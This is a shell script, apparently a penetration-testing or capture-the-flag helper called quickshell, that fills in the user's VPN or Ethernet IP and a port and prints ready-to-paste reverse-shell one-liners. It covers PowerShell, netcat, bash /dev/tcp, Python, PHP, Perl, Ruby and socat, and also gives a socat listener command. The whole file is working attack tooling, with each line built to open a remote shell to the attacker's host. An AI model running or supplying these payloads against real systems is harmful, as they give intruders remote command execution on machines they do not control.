#!/bin/sh

Y='\033[0;33m' # Yellow
C='\033[0;36m' # Cyan
NC='\033[0m' # No Color

echo "${Y}  ___  __ __ ____   __ __  _  _______ __   ___ _     _     "
echo " /   \|  |  |    | /  ]  |/ ]/ ___/  |  | /  _] |   | |    "
echo "|     |  |  ||  | /  /|  ' /(   \_|  |  |/  [_| |   | |    "
echo "|  Q  |  |  ||  |/  / |    \ \__  |  _  |    _] |___| |___ "
echo "|     |  :  ||  /   \_|     \/  \ |  |  |   [_|     |     |"
echo "|     |     ||  \     |  .  |\    |  |  |     |     |     |"
echo " \__,_|\__,_|____\____|__|\_| \___|__|__|_____|_____|_____|"
echo "${NC}>>> quick shell oneliners"                                                           
echo "    usage: quickshell.sh [IP PORT]"
echo ""

TUN0="$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')"
ETH0="$(ip -4 addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}')"
PORT=4444

heading() {
	echo "${C}[$1]${NC} "
}

[ $ETH0 ] && IP=$ETH0 && INTERFACE="eth0"
[ $TUN0 ] && IP=$TUN0 && INTERFACE="tun0"
[ $1 ] && IP=$1 
[ $2 ] && PORT=$2

[ $# -le 0 ] && echo "${Y}[+]${NC} Using default address ${C}$IP${NC} from ${C}$INTERFACE${NC}"
[ $# -le 1 ] &&	echo "${Y}[+]${NC} Using default port ${C}4444${NC}"
echo "${Y}[+]${NC} Listing reverse shells for ${C}$IP${NC}:${C}$PORT${NC}"
echo ""

heading "powershell"
echo "\$sm=(New-Object Net.Sockets.TCPClient('$IP',$PORT)).GetStream();[byte[]]\$bt=0..65535|%{0};while((\$i=\$sm.Read(\$bt,0,\$bt.Length)) -ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$bt,0,\$i);\$st=([text.encoding]::ASCII).GetBytes((iex \$d 2>&1));\$sm.Write(\$st,0,\$st.Length)}"
heading "nc"
echo "nc -e /bin/sh $IP $PORT"
heading "nc without -e"
echo "/bin/sh -c \"/bin/sh 0</tmp/backpipe | nc $IP $PORT 1>/tmp/backpipe\""
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"
heading "bash"
echo "bash -i >& /dev/tcp/$IP/$PORT 0>&1"
echo "/bin/bash -c 'bash -i >& /dev/tcp/$IP/$PORT 0>&1'"
heading "python"
echo "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$IP\",$PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);"
heading "php"
echo "php -r '\$sock=fsockopen(\"$IP\",$PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
heading "perl"
echo "perl -e 'use Socket;\$i=\"$IP\";\$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
heading "ruby"
echo "ruby -rsocket -e'f=TCPSocket.open(\"$IP\",$PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"
echo "${C}[socat]${NC} ${Y}[!]${NC} listen with ${C}socat -d -d TCP4-LISTEN:$PORT STDOUT${NC}"
echo "socat TCP4:$IP:$PORT EXEC:/bin/sh"

